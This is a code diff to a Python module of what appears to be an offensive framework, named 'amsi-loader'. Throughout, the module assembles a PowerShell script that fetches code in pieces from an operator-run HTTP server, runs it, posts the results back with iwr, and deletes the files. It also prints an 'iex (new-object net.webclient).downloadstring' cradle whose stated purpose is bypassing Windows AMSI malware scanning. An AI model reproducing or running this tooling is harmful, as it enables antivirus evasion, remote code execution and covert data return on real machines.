@@ -1,4 +1,3 @@
-import base64
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import re
 from threading import Thread
@@ -92,6 +91,11 @@ class CustomModule(Module):
     def run_module(self):
         global BYPASS_SENT, BYPASS_SENT_ERROR, BYPASS_BLOCKS, FUNCTION
 
+        BYPASS_SENT = False
+        BYPASS_SENT_ERROR = False
+        BYPASS_BLOCKS = []
+        FUNCTION = ''
+
         function = """
         function chargeFiles {
             param (
@@ -155,73 +159,64 @@ class CustomModule(Module):
             }
         }
         """
+        with open(self.args["filePath"], 'r') as file:
+            lines = file.readlines()
         
-        try:
-            with open(self.args["filePath"], 'r') as file:
-                lines = file.readlines()
-            
-            sourceUri = f"http://{self.args['ip']}:{self.args['port']}/"
-            destination = self.args["destination"]
+        sourceUri = f"http://{self.args['ip']}:{self.args['port']}/"
+        destination = self.args["destination"]
 
-            function += f'$directoryPath = "{destination}"; $sourceUri = "{sourceUri}"\n'
-            function += """
-            if (Test-Path -Path $directoryPath) {
-                Remove-Item -Path $directoryPath -Recurse -Force
-            }
-            New-Item -Path $directoryPath -ItemType Directory | Out-Null
-            """ # Create a new directory and delete content if it existed
-            
-            auxLine = 0
-            with open(self.args["lineNumbers"], 'r') as metadata:
-                for index, lineNumber in enumerate(metadata, start=0):
-                    lineNumber = lineNumber.strip()
-                    try:
-                        lineNumber = int(lineNumber)
-                    except ValueError:
-                        print_error(f"Invalid line number '{lineNumber}' in {self.args['lineNumbers']}.")
-                        return
-                    
-                    if len(lines) < lineNumber:
-                        print_error(f"The file {self.args['filePath']} does not have {lineNumber} lines.")
-                        return
+        function += f'$directoryPath = "{destination}"; $sourceUri = "{sourceUri}"\n'
+        function += """
+        if (Test-Path -Path $directoryPath) {
+            Remove-Item -Path $directoryPath -Recurse -Force
+        }
+        New-Item -Path $directoryPath -ItemType Directory | Out-Null
+        """ # Create a new directory and delete content if it existed
+        
+        auxLine = 0
+        with open(self.args["lineNumbers"], 'r') as metadata:
+            for index, lineNumber in enumerate(metadata, start=0):
+                lineNumber = lineNumber.strip()
+                try:
+                    lineNumber = int(lineNumber)
+                except ValueError:
+                    print_error(f"Invalid line number '{lineNumber}' in {self.args['lineNumbers']}.")
+                    return
+                
+                if len(lines) < lineNumber:
+                    print_error(f"The file {self.args['filePath']} does not have {lineNumber} lines.")
+                    return
 
-                    command = ''.join(lines[auxLine:lineNumber])
-                    BYPASS_BLOCKS.append(command)
-                    function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
-                    auxLine = lineNumber
-                    
-            if auxLine < len(lines):
-                command = ''.join(lines[auxLine:])
+                command = ''.join(lines[auxLine:lineNumber])
                 BYPASS_BLOCKS.append(command)
-                index += 1
                 function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
-                    
-            function += f"$result = loader -directory {destination}\n"
-            function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n" # Send result to server
-            function += f"Remove-Item -Path {destination} -Recurse -Force\n" # Delete new directory and files
+                auxLine = lineNumber
+                
+        if auxLine < len(lines):
+            command = ''.join(lines[auxLine:])
+            BYPASS_BLOCKS.append(command)
+            index += 1
+            function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
+                
+        function += f"$result = loader -directory {destination}\n"
+        function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n" # Send result to server
+        function += f"Remove-Item -Path {destination} -Recurse -Force\n" # Delete new directory and files
 
-            if self.args["instruction"]:
-                function += self.args["instruction"]
+        if self.args["instruction"]:
+            function += self.args["instruction"]
 
-            FUNCTION = function
-            
-            server = Thread(target=self.run, name='amsi-loader server', kwargs={'address': self.args["ip"], 'port': int(self.args["port"])})
-            server.start()
+        FUNCTION = function
+        
+        server = Thread(target=self.run, name='amsi-loader server', kwargs={'address': self.args["ip"], 'port': int(self.args["port"])})
+        server.start()
 
-            print_ok(f"Everything is ready. To bypass AMSI execute this on a Powershell instance:\niex (new-object net.webclient).downloadstring('{sourceUri}')")
+        print_ok(f"Everything is ready. To bypass AMSI execute this on a Powershell instance:\niex (new-object net.webclient).downloadstring('{sourceUri}')")
 
-            while not BYPASS_SENT and not BYPASS_SENT_ERROR:
-                pass
+        while not BYPASS_SENT and not BYPASS_SENT_ERROR:
+            pass
 
-        except Exception as e:
-            print_error("An error ocurred: " + e)
-        finally:
-            if BYPASS_SENT_ERROR:
-                print_error('An error occurred while sending the script.')
-
-            BYPASS_SENT = False
-            BYPASS_SENT_ERROR = False
-            BYPASS_BLOCKS = []
+        if BYPASS_SENT_ERROR:
+            print_error('An error occurred while sending the script.')
 
     def run(self, server_class=HTTPServer, handler_class=SendBypass, address=None, port=8082):
         try:
